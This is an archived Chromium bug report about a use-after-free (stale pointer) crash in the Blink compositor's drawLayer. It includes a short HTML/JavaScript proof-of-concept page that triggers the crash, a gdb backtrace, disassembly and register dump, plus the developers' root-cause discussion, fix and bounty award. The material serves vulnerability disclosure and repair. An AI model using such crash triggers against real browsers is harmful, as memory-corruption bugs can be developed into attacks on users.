# Stale pointer in WebCore::LayerRendererChromium::drawLayer

| Field | Value |
|-------|-------|
| **Issue ID** | [40088848](https://issues.chromium.org/issues/40088848) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | ma...@gmail.com |
| **Assignee** | en...@chromium.org |
| **Created** | 2011-03-13 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

When a video element with its position property set to "fixed" is appended to an arbitrary element with its visibility property set to "collapse", chromium will crash when the page is reloaded. If this is done in a document included in a second document by an iframe, the crash will occur due to a stale pointer in WebCore::LayerRendererChromium::drawLayer. If an iframe is not used, the crash will usually be caused by a null pointer dereference in the get function in third\_party/WebKit/Source/JavaScriptCore/wtf/OwnPtr.h.

**VERSION**  

Chrome Version: Chromium 10.0.648.127 Ubuntu 10.10 (stable)  

Operating System: Ubuntu 10.10

**REPRODUCTION CASE**  

crash.html:

<html>
<head><title>WebCore::LayerRendererChromium::drawLayer Crash PoC</title></head>
<body onload="boom();">
<script type="text/javascript">
setTimeout('window.location.reload()', 100);
function boom() {
arbitrary = document.createElement('arbitrary');
arbitrary.style.visibility = 'collapse';
document.body.appendChild(arbitrary);
video = document.createElement('video');
video.setAttribute('src', 'arbitrary');
video.style.position = 'fixed';
arbitrary.appendChild(video);
}
</script>
</body>
</html>

outer.html (not necessary, but helps to demonstrate the security implications):

<iframe src="crash.html"></iframe>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

$ chromium-browser --debug --single-process outer.html

# Env:

# LD\_LIBRARY\_PATH=/usr/lib/chromium-browser

# PATH=/usr/lib/chromium-browser:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

# GTK\_PATH=

# CHROMIUM\_USER\_FLAGS=

# CHROMIUM\_FLAGS=

/usr/bin/gdb /usr/lib/chromium-browser/chromium-browser -x /tmp/chromiumargs.IaJjk1  

GNU gdb (GDB) 7.2-ubuntu  

Copyright (C) 2010 Free Software Foundation, Inc.  

License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>  

This is free software: you are free to change and redistribute it.  

There is NO WARRANTY, to the extent permitted by law. Type "show copying"  

and "show warranty" for details.  

This GDB was configured as "x86\_64-linux-gnu".  

For bug reporting instructions, please see:  

<http://www.gnu.org/software/gdb/bugs/>...  

Reading symbols from /usr/lib/chromium-browser/chromium-browser...Reading symbols from /data/debug/usr/lib/chromium-browser/chromium-browser...done.  

done.  

(gdb) r

Program received signal SIGSEGV, Segmentation fault.  

[Switching to Thread 0x7fffe226b700 (LWP 19368)]  

0x000000960000012c in ?? ()  

(gdb) bt  

#0 0x000000960000012c in ?? ()  

#1 0x00007ffff646b256 in WebCore::LayerRendererChromium::drawLayer (  

this=0x7ffff936db00, layer=0x7ffff93562c0,  

targetSurface=<value optimized out>)  

at third\_party/WebKit/Source/WebCore/platform/graphics/chromium/LayerRendererChromium.cpp:691  

#2 0x00007ffff646e2d3 in WebCore::LayerRendererChromium::drawLayers (  

this=0x7ffff936db00, visibleRect=<value optimized out>,  

contentRect=<value optimized out>, scrollPosition=<value optimized out>,  

tilePaint=<value optimized out>, scrollbarPaint=<value optimized out>)  

at third\_party/WebKit/Source/WebCore/platform/graphics/chromium/LayerRendererChromium.cpp:315  

#3 0x00007ffff62193d4 in WebKit::WebViewImpl::doComposite (  

this=0x7ffff90a1480)  

at third\_party/WebKit/Source/WebKit/chromium/src/WebViewImpl.cpp:2399  

#4 0x00007ffff621e6e0 in WebKit::WebViewImpl::composite (this=0x7ffff93562c0,  

finish=96)  

at third\_party/WebKit/Source/WebKit/chromium/src/WebViewImpl.cpp:1080  

#5 0x00007ffff589cb94 in RenderWidget::DoDeferredUpdate (this=0x7ffff90d7000)  

at chrome/renderer/render\_widget.cc:619  

#6 0x00007ffff589cf29 in RenderWidget::CallDoDeferredUpdate (  

this=0x7ffff93562c0) at chrome/renderer/render\_widget.cc:528  

#7 0x00007ffff589a078 in Dispatch<RenderWidget, RenderWidget> (

(gdb) frame 1  

#1 0x00007ffff646b256 in WebCore::LayerRendererChromium::drawLayer (  

this=0x7ffff936db00, layer=0x7ffff93562c0,  

targetSurface=<value optimized out>)  

at third\_party/WebKit/Source/WebCore/platform/graphics/chromium/LayerRendererChromium.cpp:691  

691 third\_party/WebKit/Source/WebCore/platform/graphics/chromium/LayerRendererChromium.cpp: No such file or directory.  

in third\_party/WebKit/Source/WebCore/platform/graphics/chromium/LayerRendererChromium.cpp  

(gdb) disas  

Dump of assembler code for function WebCore::LayerRendererChromium::drawLayer(WebCore::LayerChromium\*, WebCore::RenderSurfaceChromium\*):  

...  

0x00007ffff646b22c <+124>: mov %rdx,0x8(%rsp)  

0x00007ffff646b231 <+129>: mov %rax,0x10(%rsp)  

0x00007ffff646b236 <+134>: mov %rdx,0x18(%rsp)  

0x00007ffff646b23b <+139>:  

callq 0x7ffff64d0e60 <WebCore::IntRect::intersects(WebCore::IntRect const&) const>  

0x00007ffff646b240 <+144>: test %al,%al  

0x00007ffff646b242 <+146>: je 0x7ffff646b1df <WebCore::LayerRendererChromium::drawLayer(WebCore::LayerChromium\*, WebCore::RenderSurfaceChromium\*)+47>  

0x00007ffff646b244 <+148>: cmpb $0x0,0x9d(%rbx)  

0x00007ffff646b24b <+155>: je 0x7ffff646b270 <WebCore::LayerRendererChromium::drawLayer(WebCore::LayerChromium\*, WebCore::RenderSurfaceChromium\*)+192>  

0x00007ffff646b24d <+157>: mov (%rbx),%rax  

0x00007ffff646b250 <+160>: mov %rbx,%rdi  

0x00007ffff646b253 <+163>: callq \*0x18(%rax)  

=> 0x00007ffff646b256 <+166>: test %al,%al  

0x00007ffff646b258 <+168>: jne 0x7ffff646b288 <WebCore::LayerRendererChromium::drawLayer(WebCore::LayerChromium\*, WebCore::RenderSurfaceChromium\*)+216>  

0x00007ffff646b25a <+170>: mov %rbx,%rdi  

0x00007ffff646b25d <+173>: callq 0x7ffff646a1a0 [WebCore::LayerChromium::drawDebugBorder()](javascript:void(0);)  

0x00007ffff646b262 <+178>: jmpq 0x7ffff646b1df <WebCore::LayerRendererChromium::drawLayer(WebCore::LayerChromium\*, WebCore::RenderSurfaceChromium\*)+47>  

---Type <return> to continue, or q <return> to quit---q  

Quit  

(gdb) i r  

rax 0x7ffff9356580 140737374414208  

rbx 0x7ffff93562c0 140737374413504  

rcx 0xa 10  

rdx 0xa0 160  

rsi 0x7fffe2269f60 140736987570016  

rdi 0x7ffff93562c0 140737374413504  

rbp 0x7ffff936db00 0x7ffff936db00  

rsp 0x7fffe2269f50 0x7fffe2269f50  

r8 0xa0 160  

r9 0xa 10  

r10 0xa 10  

r11 0x206 518  

r12 0x7ffff9356500 140737374414080  

r13 0x0 0  

r14 0x0 0  

r15 0x6 6  

rip 0x7ffff646b256 0x7ffff646b256 <WebCore::LayerRendererChromium::drawLayer(WebCore::LayerChromium\*, WebCore::RenderSurfaceChromium\*)+166>  

eflags 0x10202 [ IF RF ]  

cs 0x33 51  

ss 0x2b 43  

ds 0x0 0  

es 0x0 0  

---Type <return> to continue, or q <return> to quit---  

fs 0x0 0  

gs 0x0 0  

(gdb)

## Attachments

- [outer.html](attachments/outer.html) (text/plain; charset=us-ascii, 35 B)
- [crash.html](attachments/crash.html) (text/html; charset=us-ascii, 519 B)

## Timeline

### in...@chromium.org (2011-03-14)

[Comment Deleted]

### in...@chromium.org (2011-03-14)

m_owner is stale here.

// These belong on CCLayerImpl, but should be subclased by each type and not defer to the LayerChromium subtypes.
bool CCLayerImpl::drawsContent() const
{
    return m_owner->drawsContent();
}

Adrienne, can you please take a look.


### en...@chromium.org (2011-03-14)

If I open crash.html directly in 10.684.134, Chromium immediately hits the browser_render_process_host.cpp:515 assertion where it's received a bad message ("Transport DIB too small for given rectangle").  If I open outer.html, then I get what looks like the stale LayerChromium pointer reported above.

Abhishek, I'm a little confused by your comment.  CCLayerImpl didn't get merged to m10.  Are you seeing the stale m_owner pointer in m11 (or ToT) when running this repro case?

### en...@chromium.org (2011-03-14)

So, it looks like a stale pointer (but a slightly different one) in both m10 (original bug report) and m11 (what Abhishek mentions).  Hopefully the same fix can address both.

### ja...@chromium.org (2011-03-15)

I'm investigating the transport DIB issue mentioned in https://crbug.com/chromium/76001#c3.  I don't think it is related to the stale pointer issue seen in the renderer process.

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-03-22)

Moving m10 bugs to m11.

### bu...@chromium.org (2011-03-25)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=79349

------------------------------------------------------------------------
r79349 | jamesr@chromium.org | Thu Mar 24 17:14:00 PDT 2011

Changed paths:
 M http://src.chromium.org/viewvc/chrome/trunk/src/content/renderer/render_widget.cc?r1=79349&r2=79348&pathrev=79349
 M http://src.chromium.org/viewvc/chrome/trunk/src/content/plugin/webplugin_accelerated_surface_proxy_mac.cc?r1=79349&r2=79348&pathrev=79349
 M http://src.chromium.org/viewvc/chrome/trunk/src/content/renderer/pepper_plugin_delegate_impl.cc?r1=79349&r2=79348&pathrev=79349
 M http://src.chromium.org/viewvc/chrome/trunk/src/content/browser/renderer_host/accelerated_surface_container_mac.cc?r1=79349&r2=79348&pathrev=79349
 M http://src.chromium.org/viewvc/chrome/trunk/src/content/browser/renderer_host/mock_render_process_host.cc?r1=79349&r2=79348&pathrev=79349
 M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/renderer_host/browser_render_process_host.cc?r1=79349&r2=79348&pathrev=79349
 M http://src.chromium.org/viewvc/chrome/trunk/src/app/surface/transport_dib_linux.cc?r1=79349&r2=79348&pathrev=79349
 M http://src.chromium.org/viewvc/chrome/trunk/src/content/plugin/webplugin_proxy.cc?r1=79349&r2=79348&pathrev=79349
 M http://src.chromium.org/viewvc/chrome/trunk/src/app/surface/transport_dib_mac.cc?r1=79349&r2=79348&pathrev=79349
 M http://src.chromium.org/viewvc/chrome/trunk/src/content/common/common_param_traits.h?r1=79349&r2=79348&pathrev=79349
 M http://src.chromium.org/viewvc/chrome/trunk/src/app/surface/transport_dib.h?r1=79349&r2=79348&pathrev=79349
 M http://src.chromium.org/viewvc/chrome/trunk/src/app/surface/accelerated_surface_mac.cc?r1=79349&r2=79348&pathrev=79349
 M http://src.chromium.org/viewvc/chrome/trunk/src/app/surface/transport_dib_win.cc?r1=79349&r2=79348&pathrev=79349

Adds a TransportDIB::Id value that is explicitly invalid and use it when compositing

BUG=76001
TEST=

Review URL: http://codereview.chromium.org/6665029
------------------------------------------------------------------------

### in...@chromium.org (2011-03-29)

Adrienne, ping ! did you get a chance to fix the stale pointer ?

### in...@chromium.org (2011-03-29)

Adrienne, ping ! did you get a chance to fix the stale pointer ?

### en...@chromium.org (2011-03-29)

No, I have not had a chance yet.  I took a quick look at it on Friday, but didn't see any obvious problem or fix.

### sc...@gmail.com (2011-03-29)

Since it's a security bug, hopefully we can still get it fixed in time for M11?

### en...@chromium.org (2011-03-30)

Ah, this looks like another "painting turns off compositing" bug.

Looking at the callstack, RenderLayerCompositor::enableCompositingMode(false) gets called during paint, which deletes some GraphicsLayers which through a chain of indirection deletes some CCLayerImpls.  These CCLayerImpls are being held onto by naked pointers in a vector, and hence this bug.

### ch...@gmail.com (2011-03-30)

@enne if we make RenderSurfaceChromium's m_layerList into a vector of refptrs that should do the trick for this bug. I am a little frightened by the fact that there are raw pointers to CCLayerImpls all over this code. Should we be changing all of this code to hold ref pointers? 

### ja...@chromium.org (2011-03-30)

@cdn m_layerList being RefPtr<>s will not do the trick.  Changing all of this code to RefPtr<>s will also not fix anything.

### ch...@gmail.com (2011-03-30)

@jamesr I have a patch that fixes it by doing that. Are there underlying issues I am not seeing with the way I do it?

### ja...@chromium.org (2011-03-30)

Yes, there are issues.  I can show you if you like, we can just let enne@ finish the proper fix.

### ch...@gmail.com (2011-03-30)

no worries

### en...@chromium.org (2011-03-31)

https://bugs.webkit.org/show_bug.cgi?id=57577

### en...@chromium.org (2011-03-31)

As a note, I ended up using RefPtrs as cdn suggested above.  James and I had thought that maybe the owner pointer from LayerChromium to the GraphicsLayer would also be stale, but it turns out that this is nulled out as a part of the GraphicsLayerChromium destructor.

### en...@chromium.org (2011-03-31)

[Comment Deleted]

### in...@chromium.org (2011-03-31)

Fixed in http://trac.webkit.org/changeset/82624

### sc...@gmail.com (2011-04-01)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-04-01)

Affected M10.
Merged to M11: http://trac.webkit.org/changeset/82706
Non-trivial merge but easy enough to resolve.

### en...@chromium.org (2011-04-11)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-04-14)

Nice bug. Uncovered a bunch of lifetime issues that we're happy to be without. $1000.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-04-22)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-05-04)

Invoice finalized; payment is in e-payment system; it can take a couple of weeks.

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-26)

This issue was migrated from crbug.com/chromium/76001?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40088848)*
